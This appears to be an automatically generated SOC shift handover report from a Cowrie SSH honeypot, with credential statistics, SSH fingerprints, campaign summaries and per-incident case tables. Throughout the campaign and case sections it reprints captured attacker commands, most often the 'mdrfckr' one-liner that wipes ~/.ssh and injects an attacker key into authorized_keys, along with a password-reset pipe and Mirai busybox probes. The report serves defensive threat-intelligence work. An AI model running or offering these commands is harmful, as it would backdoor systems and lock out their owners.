# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-04 |
| **Generated At** | 2026-11-04T19:03:10Z |
| **Shift Time** | 19:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **456** |
| Confirmed Threats | **365** |
| False Positives Filtered | **91** (20.0%) |
| Unique Attacker IPs | **248** |
| Countries of Origin | **51** |
| High Severity Cases | **239** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **217** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3397** |
| Unique Credential Pairs | **1610** |
| Unique Usernames | **620** |
| Unique Passwords | **1125** |
| Successful Auth Pairs | **3134** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1032 |
| `ubuntu` | 118 |
| `rootssssss23424123123` | 104 |
| `admin` | 95 |
| `user` | 59 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 157 |
| `rootssssss23424123123` | 104 |
| `root3245gs5662d34111111111` | 104 |
| `123` | 85 |
| `1234` | 72 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 104 |
| `root` | `root3245gs5662d34111111111` | 56 |
| `support` | `support` | 35 |
| `admin` | `admin` | 26 |
| `345gs5662d34` | `345gs5662d34` | 19 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root@123` | `97.74.236.4` | 2026-11-04T02:56:28 |
| `rootssssss23424123123` | `rootssssss23424123123` | `97.74.236.4` | 2026-11-04T02:56:29 |
| `root` | `root3245gs5662d34111111111` | `97.74.236.4` | 2026-11-04T02:56:35 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `150.241.96.65` | 2026-11-04T02:56:42 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `138.124.124.210` | 2026-11-04T02:56:59 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-11-04T03:06:38 |
| `admin` | `admin` | `72.46.87.211` | 2026-11-04T03:17:05 |
| `support` | `support` | `176.53.159.196` | 2026-11-04T03:19:29 |
| `ec2-user` | `123456789` | `191.253.117.212` | 2026-11-04T03:39:28 |
| `345gs5662d34` | `345gs5662d34` | `191.253.117.212` | 2026-11-04T03:39:32 |
| `ec2-user` | `3245gs5662d34` | `191.253.117.212` | 2026-11-04T03:39:33 |
| `user` | `user!@#$` | `121.204.171.142` | 2026-11-04T03:39:57 |
| `root` | `Pass1234` | `185.125.200.213` | 2026-11-04T03:44:28 |
| `345gs5662d34` | `345gs5662d34` | `185.125.200.213` | 2026-11-04T03:44:31 |
| `root` | `3245gs5662d34` | `185.125.200.213` | 2026-11-04T03:44:31 |
| `vv` | `vv` | `10.0.0.73` | 2026-11-04T03:57:03 |
| `rootssssss23424123123` | `rootssssss23424123123` | `10.0.0.73` | 2026-11-04T03:57:06 |
| `vv` | `root3245gs5662d34111111111` | `10.0.0.73` | 2026-11-04T03:57:08 |
| `root` | `admin` | `193.32.162.15` | 2026-11-04T04:09:24 |
| `b3` | `b3` | `10.0.0.73` | 2026-11-04T04:15:03 |
_… 3114 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **456** |
| Sessions with Fingerprint | **29** |
| Unique HASSH Fingerprints | **29** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 159 |
| Go SSH scanner | 95 |
| Unknown | 5 |
| PuTTY | 4 |
| OpenSSH | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 131 | 71 |
| `2ec37a7cc8da...` | Mirai/variant | 58 | 3 |
| `16443846184e...` | Generic scanner | 7 | 3 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |
| `084386fa7ae5...` | Mirai/variant | 4 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 131 | 71 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 58 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 16 | 8 | — |
| `16443846184e...` | Go SSH scanner | 7 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 4 | 4 | Mirai/variant |
| `af8223ac9914...` | libssh | 4 | 3 | libssh-based |
| `5bd26477da54...` | PuTTY | 4 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **70** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 104 | 60 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "github\nqt9w7Dtaj2kk\nqt9w7Dtaj2kk"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `180.76.60.83`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `34.81.19.39`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.191.191`, `88.147.30.59`, `103.25.47.94`, `2.229.200.226`, `14.103.159.154`, `47.109.143.43`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **248** |
| Unique ASNs | **128** |
| High-Risk ASNs | **101** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 55 | HIGH |
| `AS396982` | Google LLC | 10 | HIGH |
| `AS14061` | DigitalOcean, LLC | 7 | HIGH |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | LOW |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS16509` | Amazon.com, Inc. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (223)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e6297c58005d

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-11-04 02:56 |
| **Last Seen** | 2026-11-04 02:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 02:56:27` | `cowrie.session.connect` |
| `2026-11-04 02:56:27` | `cowrie.client.version` |
| `2026-11-04 02:56:27` | `cowrie.client.kex` |
| `2026-11-04 02:56:28` | `cowrie.login.success` |
| `2026-11-04 02:56:28` | `cowrie.session.params` |
| `2026-11-04 02:56:28` | `cowrie.command.input` |
| `2026-11-04 02:56:28` | `cowrie.command.failed` |
| `2026-11-04 02:56:28` | `cowrie.log.closed` |
| `2026-11-04 02:56:29` | `cowrie.session.params` |
| `2026-11-04 02:56:29` | `cowrie.command.input` |
| `2026-11-04 02:56:29` | `cowrie.session.file_download` |
| `2026-11-04 02:56:29` | `cowrie.log.closed` |
| `2026-11-04 02:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d70a51420378

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-11-04 02:56 |
| **Last Seen** | 2026-11-04 02:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 02:56:29` | `cowrie.session.connect` |
| `2026-11-04 02:56:29` | `cowrie.client.version` |
| `2026-11-04 02:56:29` | `cowrie.client.kex` |
| `2026-11-04 02:56:29` | `cowrie.login.success` |
| `2026-11-04 02:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62e2d34003b5

| Field | Detail |
|---|---|
| **Source IP** | `72.46.87[.]211` |
| **First Seen** | 2026-11-04 03:17 |
| **Last Seen** | 2026-11-04 03:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m, cat /proc, >` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:17:05` | `cowrie.session.connect` |
| `2026-11-04 03:17:05` | `cowrie.login.success` |
| `2026-11-04 03:17:06` | `cowrie.session.params` |
| `2026-11-04 03:17:06` | `cowrie.command.input` |
| `2026-11-04 03:17:07` | `cowrie.command.input` |
| `2026-11-04 03:17:07` | `cowrie.command.input` |
| `2026-11-04 03:17:10` | `cowrie.log.closed` |
| `2026-11-04 03:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.46.87[.]211` to AbuseIPDB if not already reported
- [ ] Block `72.46.87[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0aef8c2f3c6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-04 03:19 |
| **Last Seen** | 2026-11-04 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:19:28` | `cowrie.session.connect` |
| `2026-11-04 03:19:28` | `cowrie.client.version` |
| `2026-11-04 03:19:28` | `cowrie.client.kex` |
| `2026-11-04 03:19:29` | `cowrie.login.success` |
| `2026-11-04 03:19:29` | `cowrie.direct-tcpip.request` |
| `2026-11-04 03:19:29` | `cowrie.direct-tcpip.data` |
| `2026-11-04 03:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6593965c81d6

| Field | Detail |
|---|---|
| **Source IP** | `191.253.117[.]212` |
| **First Seen** | 2026-11-04 03:39 |
| **Last Seen** | 2026-11-04 03:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:39:27` | `cowrie.session.connect` |
| `2026-11-04 03:39:27` | `cowrie.client.version` |
| `2026-11-04 03:39:27` | `cowrie.client.kex` |
| `2026-11-04 03:39:28` | `cowrie.login.success` |
| `2026-11-04 03:39:29` | `cowrie.session.params` |
| `2026-11-04 03:39:29` | `cowrie.command.input` |
| `2026-11-04 03:39:29` | `cowrie.command.failed` |
| `2026-11-04 03:39:29` | `cowrie.log.closed` |
| `2026-11-04 03:39:30` | `cowrie.session.params` |
| `2026-11-04 03:39:30` | `cowrie.command.input` |
| `2026-11-04 03:39:30` | `cowrie.session.file_download` |
| `2026-11-04 03:39:30` | `cowrie.log.closed` |
| `2026-11-04 03:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.253.117[.]212` to AbuseIPDB if not already reported
- [ ] Block `191.253.117[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da486d0cd33c

| Field | Detail |
|---|---|
| **Source IP** | `191.253.117[.]212` |
| **First Seen** | 2026-11-04 03:39 |
| **Last Seen** | 2026-11-04 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:39:31` | `cowrie.session.connect` |
| `2026-11-04 03:39:31` | `cowrie.client.version` |
| `2026-11-04 03:39:31` | `cowrie.client.kex` |
| `2026-11-04 03:39:32` | `cowrie.login.success` |
| `2026-11-04 03:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.253.117[.]212` to AbuseIPDB if not already reported
- [ ] Block `191.253.117[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff535c6b4d2

| Field | Detail |
|---|---|
| **Source IP** | `121.204.171[.]142` |
| **First Seen** | 2026-11-04 03:39 |
| **Last Seen** | 2026-11-04 03:44 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:39:55` | `cowrie.session.connect` |
| `2026-11-04 03:39:55` | `cowrie.client.version` |
| `2026-11-04 03:39:56` | `cowrie.client.kex` |
| `2026-11-04 03:39:57` | `cowrie.login.success` |
| `2026-11-04 03:39:58` | `cowrie.session.params` |
| `2026-11-04 03:39:58` | `cowrie.command.input` |
| `2026-11-04 03:39:58` | `cowrie.command.failed` |
| `2026-11-04 03:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.204.171[.]142` to AbuseIPDB if not already reported
- [ ] Block `121.204.171[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef838cd3051d

| Field | Detail |
|---|---|
| **Source IP** | `185.125.200[.]213` |
| **First Seen** | 2026-11-04 03:44 |
| **Last Seen** | 2026-11-04 03:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:44:28` | `cowrie.session.connect` |
| `2026-11-04 03:44:28` | `cowrie.client.version` |
| `2026-11-04 03:44:28` | `cowrie.client.kex` |
| `2026-11-04 03:44:28` | `cowrie.login.success` |
| `2026-11-04 03:44:29` | `cowrie.session.params` |
| `2026-11-04 03:44:29` | `cowrie.command.input` |
| `2026-11-04 03:44:29` | `cowrie.command.failed` |
| `2026-11-04 03:44:29` | `cowrie.log.closed` |
| `2026-11-04 03:44:30` | `cowrie.session.params` |
| `2026-11-04 03:44:30` | `cowrie.command.input` |
| `2026-11-04 03:44:30` | `cowrie.session.file_download` |
| `2026-11-04 03:44:30` | `cowrie.log.closed` |
| `2026-11-04 03:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.125.200[.]213` to AbuseIPDB if not already reported
- [ ] Block `185.125.200[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c2890deaa8d

| Field | Detail |
|---|---|
| **Source IP** | `185.125.200[.]213` |
| **First Seen** | 2026-11-04 03:44 |
| **Last Seen** | 2026-11-04 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 03:44:30` | `cowrie.session.connect` |
| `2026-11-04 03:44:30` | `cowrie.client.version` |
| `2026-11-04 03:44:30` | `cowrie.client.kex` |
| `2026-11-04 03:44:31` | `cowrie.login.success` |
| `2026-11-04 03:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.125.200[.]213` to AbuseIPDB if not already reported
- [ ] Block `185.125.200[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddac90b7b1e9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-11-04 04:09 |
| **Last Seen** | 2026-11-04 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:09:22` | `cowrie.session.connect` |
| `2026-11-04 04:09:23` | `cowrie.client.version` |
| `2026-11-04 04:09:23` | `cowrie.client.kex` |
| `2026-11-04 04:09:24` | `cowrie.login.success` |
| `2026-11-04 04:09:24` | `cowrie.direct-tcpip.request` |
| `2026-11-04 04:09:24` | `cowrie.direct-tcpip.ja4` |
| `2026-11-04 04:09:24` | `cowrie.direct-tcpip.data` |
| `2026-11-04 04:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc3bbd07d12a

| Field | Detail |
|---|---|
| **Source IP** | `118.194.238[.]132` |
| **First Seen** | 2026-11-04 04:16 |
| **Last Seen** | 2026-11-04 04:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:16:40` | `cowrie.session.connect` |
| `2026-11-04 04:16:40` | `cowrie.client.version` |
| `2026-11-04 04:16:40` | `cowrie.client.kex` |
| `2026-11-04 04:16:41` | `cowrie.login.success` |
| `2026-11-04 04:16:42` | `cowrie.session.params` |
| `2026-11-04 04:16:42` | `cowrie.command.input` |
| `2026-11-04 04:16:42` | `cowrie.command.failed` |
| `2026-11-04 04:16:43` | `cowrie.log.closed` |
| `2026-11-04 04:16:43` | `cowrie.session.params` |
| `2026-11-04 04:16:43` | `cowrie.command.input` |
| `2026-11-04 04:16:44` | `cowrie.session.file_download` |
| `2026-11-04 04:16:44` | `cowrie.log.closed` |
| `2026-11-04 04:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.238[.]132` to AbuseIPDB if not already reported
- [ ] Block `118.194.238[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23bbfba220c7

| Field | Detail |
|---|---|
| **Source IP** | `118.194.238[.]132` |
| **First Seen** | 2026-11-04 04:16 |
| **Last Seen** | 2026-11-04 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:16:44` | `cowrie.session.connect` |
| `2026-11-04 04:16:44` | `cowrie.client.version` |
| `2026-11-04 04:16:44` | `cowrie.client.kex` |
| `2026-11-04 04:16:45` | `cowrie.login.success` |
| `2026-11-04 04:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.238[.]132` to AbuseIPDB if not already reported
- [ ] Block `118.194.238[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2294697187

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]203` |
| **First Seen** | 2026-11-04 04:21 |
| **Last Seen** | 2026-11-04 04:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 04:21:26` | `cowrie.session.connect` |
| `2026-11-04 04:21:26` | `cowrie.client.version` |
| `2026-11-04 04:21:26` | `cowrie.client.kex` |
| `2026-11-04 04:21:27` | `cowrie.login.success` |
| `2026-11-04 04:21:28` | `cowrie.session.params` |
| `2026-11-04 04:21:28` | `cowrie.command.input` |
| `2026-11-04 04:21:28` | `cowrie.command.failed` |
| `2026-11-04 04:21:29` | `cowrie.log.closed` |
